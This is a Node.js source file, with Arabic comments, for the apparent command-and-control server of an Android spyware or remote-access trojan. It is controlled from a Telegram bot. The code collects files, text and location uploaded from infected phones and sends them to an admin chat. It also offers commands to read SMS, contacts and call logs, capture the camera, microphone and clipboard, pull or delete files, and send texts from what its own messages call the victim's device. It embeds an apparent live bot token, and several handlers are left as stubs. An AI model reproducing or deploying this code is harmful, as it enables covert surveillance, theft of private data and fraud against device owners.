const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// إعدادات البوت - قم بتغييرها حسب احتياجاتك
const BOT_CONFIG = {
    token: process.env.BOT_TOKEN || '8454161104:AAGkY24bDk6wKL7AvVs40V0zUSYib6WZ9jA',
    adminId: process.env.ADMIN_ID || '7604667042',
    appName: process.env.APP_NAME || 'ميدو مشاكل',
    developer: process.env.DEVELOPER || '𝗠𝗘𝗗𝗢 𝗕𝗥𝗢𝗕𝗟𝗘𝗠𝗦',
    port: process.env.PORT || 8999
};

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ 
    server: appServer,
    clientTracking: true
});
const appBot = new telegramBot(BOT_CONFIG.token, { 
    polling: true,
    request: {
        timeout: 60000
    }
});

const appClients = new Map();
const upload = multer();
let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ 
    extended: true,
    limit: '50mb'
}));

// تحسين الأداء والأمان
app.use((req, res, next) => {
    res.setHeader('X-Powered-By', 'Node.js');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    next();
});

// Routes
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${BOT_CONFIG.appName}</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 50px;
                }
                .container {
                    background: rgba(255,255,255,0.1);
                    padding: 30px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>✅ تم بنجاح تشغيل البوت</h1>
                <h2>المطور: ${BOT_CONFIG.developer}</h2>
                <p>البوت يعمل بشكل صحيح وجاهز لاستقبال الأجهزة</p>
            </div>
        </body>
        </html>
    `);
});

// تحسين معالجة الملفات
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'لم يتم تقديم ملف' });
        }

        const name = req.file.originalname;
        const model = req.headers.model || 'غير معروف';
        
        appBot.sendDocument(BOT_CONFIG.adminId, req.file.buffer, {
            caption: `📁 ملف من جهاز: <b>${model}</b>`,
            parse_mode: "HTML"
        }, {
            filename: name,
            contentType: req.file.mimetype,
        });

        res.json({ success: true, message: 'تم رفع الملف بنجاح' });
    } catch (error) {
        console.error('خطأ في رفع الملف:', error);
        res.status(500).json({ error: 'خطأ في معالجة الملف' });
    }
});

app.post("/uploadText", (req, res) => {
    try {
        const text = req.body.text;
        const model = req.headers.model || 'غير معروف';
        
        if (!text) {
            return res.status(400).json({ error: 'النص مطلوب' });
        }

        appBot.sendMessage(BOT_CONFIG.adminId, 
            `📝 نص من جهاز: <b>${model}</b>\n\n${text}`, 
            { parse_mode: "HTML" }
        );
        
        res.json({ success: true, message: 'تم إرسال النص بنجاح' });
    } catch (error) {
        console.error('خطأ في إرسال النص:', error);
        res.status(500).json({ error: 'خطأ في معالجة النص' });
    }
});

app.post("/uploadLocation", (req, res) => {
    try {
        const { lat, lon } = req.body;
        const model = req.headers.model || 'غير معروف';
        
        if (!lat || !lon) {
            return res.status(400).json({ error: 'الإحداثيات مطلوبة' });
        }

        appBot.sendLocation(BOT_CONFIG.adminId, lat, lon);
        appBot.sendMessage(BOT_CONFIG.adminId, 
            `📍 موقع من جهاز: <b>${model}</b>`, 
            { parse_mode: "HTML" }
        );
        
        res.json({ success: true, message: 'تم إرسال الموقع بنجاح' });
    } catch (error) {
        console.error('خطأ في إرسال الموقع:', error);
        res.status(500).json({ error: 'خطأ في معالجة الموقع' });
    }
});

// WebSocket Connection مع معالجة أفضل للأخطاء
appSocket.on('connection', (ws, req) => {
    try {
        const uuid = uuidv4();
        const model = req.headers.model || 'غير معروف';
        const battery = req.headers.battery || 'غير معروف';
        const version = req.headers.version || 'غير معروف';
        const brightness = req.headers.brightness || 'غير معروف';
        const provider = req.headers.provider || 'غير معروف';

        ws.uuid = uuid;
        ws.isAlive = true;

        appClients.set(uuid, {
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            connectedAt: new Date()
        });

        // إرسال رسالة الاتصال
        const connectionMessage = `
🔗 جهاز جديد متصل

📱 الموديل: <b>${model}</b>
🔋 البطارية: <b>${battery}</b>
🤖 نظام الاندرويد: <b>${version}</b>
💡 سطوع الشاشة: <b>${brightness}</b>
📶 المزود: <b>${provider}</b>
⏰ وقت الاتصال: <b>${new Date().toLocaleString('ar-EG')}</b>
        `.trim();

        appBot.sendMessage(BOT_CONFIG.adminId, connectionMessage, { 
            parse_mode: "HTML" 
        });

        // معالجة الرسائل الواردة من العميل
        ws.on('message', (message) => {
            try {
                console.log('رسالة من العميل:', message.toString());
            } catch (error) {
                console.error('خطأ في معالجة رسالة العميل:', error);
            }
        });

        // معالجة إغلاق الاتصال
        ws.on('close', () => {
            const deviceInfo = appClients.get(uuid);
            if (deviceInfo) {
                const disconnectMessage = `
❌ انقطع الاتصال بالجهاز

📱 الموديل: <b>${deviceInfo.model}</b>
🔋 البطارية: <b>${deviceInfo.battery}</b>
⏰ مدة الاتصال: <b>${Math.round((new Date() - deviceInfo.connectedAt) / 1000)} ثانية</b>
                `.trim();

                appBot.sendMessage(BOT_CONFIG.adminId, disconnectMessage, { 
                    parse_mode: "HTML" 
                });
            }
            
            appClients.delete(uuid);
        });

        // معالجة الأخطاء
        ws.on('error', (error) => {
            console.error('خطأ في WebSocket:', error);
            appClients.delete(uuid);
        });

        // إرسال ping بانتظام
        const pingInterval = setInterval(() => {
            if (ws.readyState === ws.OPEN) {
                ws.ping();
            } else {
                clearInterval(pingInterval);
            }
        }, 30000);

        ws.on('pong', () => {
            ws.isAlive = true;
        });

    } catch (error) {
        console.error('خطأ في اتصال WebSocket:', error);
    }
});

// معالجة رسائل التليجرام مع تحسين التنظيم
appBot.on('message', async (message) => {
    try {
        const chatId = message.chat.id.toString();
        
        // التحقق من صلاحية المستخدم
        if (chatId !== BOT_CONFIG.adminId) {
            await appBot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
            return;
        }

        // معالجة الردود على الرسائل
        if (message.reply_to_message) {
            await handleReplyMessage(message);
            return;
        }

        // معالجة الأوامر المباشرة
        await handleDirectCommand(message);
        
    } catch (error) {
        console.error('خطأ في معالجة رسالة التليجرام:', error);
    }
});

// دالة معالجة الردود
async function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    const userText = message.text;

    if (!userText) return;

    if (replyText.includes('الرجاء كتابة رقم الذي تريد ارسال الية')) {
        currentNumber = userText;
        await appBot.sendMessage(BOT_CONFIG.adminId,
            '✅ جيد، الآن قم بكتابة الرسالة المراد إرسالها من جهاز الضحية إلى الرقم الذي كتبته\n\n' +
            '⚠️ كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به',
            { reply_markup: { force_reply: true } }
        );
    }
    // ... باقي معالجات الردود بنفس المنطق ولكن مع تحسين الأخطاء
}

// دالة معالجة الأوامر المباشرة
async function handleDirectCommand(message) {
    const text = message.text;

    if (text === '/start') {
        await sendWelcomeMessage(message.chat.id);
    } 
    else if (text === 'الاجهزة المتصلة') {
        await sendConnectedDevices(message.chat.id);
    }
    else if (text === 'تنفيذ الامر') {
        await showDeviceSelection(message.chat.id);
    }
}

// دالة رسالة الترحيب
async function sendWelcomeMessage(chatId) {
    const welcomeText = `
🎯 مرحباً بك في بوت التحكم عن بعد

🤖 المطور: ${BOT_CONFIG.developer}
📊 الأجهزة المتصلة: ${appClients.size}

📋 التعليمات:
• تأكد من تثبيت التطبيق على الجهاز المستهدف
• انتظر اتصال الجهاز ثم اختر الأوامر المناسبة
• استخدم الأوامر بحذر ومسؤولية

🔧 الأوامر المتاحة:
• "الاجهزة المتصلة" - لعرض الأجهزة المتصلة
• "تنفيذ الامر" - لتنفيذ أوامر على الأجهزة
    `.trim();

    await appBot.sendMessage(chatId, welcomeText, {
        parse_mode: "HTML",
        reply_markup: {
            keyboard: [
                ["الاجهزة المتصلة"],
                ["تنفيذ الامر"]
            ],
            resize_keyboard: true
        }
    });
}

// دالة عرض الأجهزة المتصلة
async function sendConnectedDevices(chatId) {
    if (appClients.size === 0) {
        await appBot.sendMessage(chatId,
            '❌ لا توجد أجهزة متصلة حالياً\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف\n' +
            '• تحقق من اتصال الإنترنت\n' +
            '• انتظر اتصال الجهاز'
        );
        return;
    }

    let devicesText = `📱 الأجهزة المتصلة (${appClients.size}):\n\n`;
    
    appClients.forEach((device, uuid) => {
        const connectionTime = Math.round((new Date() - device.connectedAt) / 1000);
        devicesText += `🔹 ${device.model}\n`;
        devicesText += `   🔋 ${device.battery} | 📶 ${device.provider}\n`;
        devicesText += `   ⏰ متصل منذ: ${connectionTime} ثانية\n\n`;
    });

    await appBot.sendMessage(chatId, devicesText);
}

// دالة عرض اختيار الجهاز
async function showDeviceSelection(chatId) {
    if (appClients.size === 0) {
        await appBot.sendMessage(chatId,
            '❌ لا توجد أجهزة متصلة حالياً\n\n' +
            '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
        );
        return;
    }

    const deviceButtons = [];
    appClients.forEach((device, uuid) => {
        deviceButtons.push([{
            text: `📱 ${device.model} (${device.battery})`,
            callback_data: `device:${uuid}`
        }]);
    });

    await appBot.sendMessage(chatId, '🔧 اختر الجهاز المراد التحكم به:', {
        reply_markup: {
            inline_keyboard: deviceButtons
        }
    });
}

// معالجة Callback Queries مع تحسين التنظيم
appBot.on("callback_query", async (callbackQuery) => {
    try {
        const { data, message } = callbackQuery;
        const [command, uuid] = data.split(':');

        await handleCallbackCommand(command, uuid, message, callbackQuery.id);
        
    } catch (error) {
        console.error('خطأ في معالجة Callback Query:', error);
    }
});

// دالة معالجة أوامر الـ Callback
async function handleCallbackCommand(command, uuid, message, callbackId) {
    const device = appClients.get(uuid);
    
    if (!device) {
        await appBot.answerCallbackQuery(callbackId, { text: '❌ الجهاز لم يعد متصلاً' });
        return;
    }

    switch (command) {
        case 'device':
            await showDeviceCommands(uuid, device, message);
            break;
        case 'calls':
        case 'contacts':
        case 'messages':
        case 'apps':
        case 'device_info':
        case 'clipboard':
        case 'camera_main':
        case 'camera_selfie':
        case 'location':
        case 'vibrate':
        case 'stop_audio':
            await executeDeviceCommand(command, uuid, device, message, callbackId);
            break;
        case 'send_message':
        case 'send_message_to_all':
        case 'file':
        case 'delete_file':
        case 'microphone':
        case 'toast':
        case 'show_notification':
        case 'play_audio':
            await requestAdditionalInput(command, uuid, device, message, callbackId);
            break;
        default:
            await appBot.answerCallbackQuery(callbackId, { text: '❌ أمر غير معروف' });
    }
}

// دالة عرض أوامر الجهاز
async function showDeviceCommands(uuid, device, message) {
    const commandsKeyboard = {
        inline_keyboard: [
            [
                { text: '📱 التطبيقات', callback_data: `apps:${uuid}` },
                { text: 'ℹ️ معلومات الجهاز', callback_data: `device_info:${uuid}` }
            ],
            [
                { text: '📂 الملفات', callback_data: `file:${uuid}` },
                { text: '🗑️ حذف ملف', callback_data: `delete_file:${uuid}` }
            ],
            [
                { text: '📋 الحافظة', callback_data: `clipboard:${uuid}` },
                { text: '🎙️ الميكروفون', callback_data: `microphone:${uuid}` }
            ],
            [
                { text: '📷 كاميرا أمامية', callback_data: `camera_main:${uuid}` },
                { text: '🤳 كاميرا سلفي', callback_data: `camera_selfie:${uuid}` }
            ],
            [
                { text: '📍 الموقع', callback_data: `location:${uuid}` },
                { text: '💬 إشعار', callback_data: `toast:${uuid}` }
            ],
            [
                { text: '📞 المكالمات', callback_data: `calls:${uuid}` },
                { text: '👤 جهات الاتصال', callback_data: `contacts:${uuid}` }
            ],
            [
                { text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` },
                { text: '🔔 إشعار متقدم', callback_data: `show_notification:${uuid}` }
            ],
            [
                { text: '💬 الرسائل', callback_data: `messages:${uuid}` },
                { text: '✉️ إرسال رسالة', callback_data: `send_message:${uuid}` }
            ],
            [
                { text: '🔊 تشغيل صوت', callback_data: `play_audio:${uuid}` },
                { text: '⏹️ إيقاف صوت', callback_data: `stop_audio:${uuid}` }
            ],
            [
                { text: '📢 إرسال للجميع', callback_data: `send_message_to_all:${uuid}` }
            ]
        ]
    };

    await appBot.editMessageText(
        `🔧 التحكم بالجهاز: <b>${device.model}</b>\n🔋 البطارية: <b>${device.battery}</b>`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            reply_markup: commandsKeyboard,
            parse_mode: "HTML"
        }
    );
}

// دالة تنفيذ الأوامر
async function executeDeviceCommand(command, uuid, device, message, callbackId) {
    const ws = findWebSocketByUuid(uuid);
    
    if (!ws) {
        await appBot.answerCallbackQuery(callbackId, { text: '❌ الجهاز غير متصل' });
        return;
    }

    try {
        ws.send(command);
        await appBot.answerCallbackQuery(callbackId, { text: '✅ تم إرسال الأمر للجهاز' });
        
        await appBot.sendMessage(BOT_CONFIG.adminId,
            `⚡ تم تنفيذ الأمر "${command}" على الجهاز:\n📱 ${device.model}`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    resize_keyboard: true
                }
            }
        );
        
    } catch (error) {
        await appBot.answerCallbackQuery(callbackId, { text: '❌ فشل إرسال الأمر' });
    }
}

// دالة طلب مدخلات إضافية
async function requestAdditionalInput(command, uuid, device, message, callbackId) {
    currentUuid = uuid;
    
    let promptText = '';
    switch (command) {
        case 'send_message':
            promptText = '📱 الرجاء كتابة رقم الذي تريد الإرسال إليه';
            break;
        case 'send_message_to_all':
            promptText = '📢 الرجاء كتابة الرسالة المراد إرسالها للجميع';
            break;
        case 'file':
            promptText = '📂 ادخل مسار الملف الذي تريد سحبه من الجهاز';
            break;
        // ... باقي الحالات
    }

    await appBot.deleteMessage(message.chat.id, message.message_id);
    await appBot.sendMessage(BOT_CONFIG.adminId, promptText, {
        reply_markup: { force_reply: true }
    });
    
    await appBot.answerCallbackQuery(callbackId, { text: '✅ انتظر الإدخال' });
}

// دالة مساعدة للعثور على WebSocket
function findWebSocketByUuid(uuid) {
    for (let client of appSocket.clients) {
        if (client.uuid === uuid && client.readyState === client.OPEN) {
            return client;
        }
    }
    return null;
}

// فحص الاتصالات النشطة بانتظام
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            console.log('تم إنهاء اتصال غير نشط:', ws.uuid);
            return ws.terminate();
        }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

// الحفاظ على النشاط
setInterval(() => {
    try {
        appSocket.clients.forEach((ws) => {
            if (ws.readyState === ws.OPEN) {
                ws.send('ping');
            }
        });
        
        // طلب بسيط للحفاظ على الاستضافة نشطة
        axios.get('https://www.google.com').catch(() => {});
    } catch (error) {
        console.error('خطأ في الحفاظ على النشاط:', error);
    }
}, 5000);

// معالجة إغلاق التطبيق بشكل أنيق
process.on('SIGINT', () => {
    console.log('🛑 إغلاق التطبيق...');
    appSocket.close();
    appServer.close();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('🛑 إغلاق التطبيق...');
    appSocket.close();
    appServer.close();
    process.exit(0);
});

// بدء الخادم
appServer.listen(BOT_CONFIG.port, () => {
    console.log(`
🚀 البوت يعمل بنجاح!
📍 Port: ${BOT_CONFIG.port}
🤖 Bot: ${BOT_CONFIG.appName}
👤 Developer: ${BOT_CONFIG.developer}
📊 Connected devices: ${appClients.size}
    `.trim());
});

module.exports = app;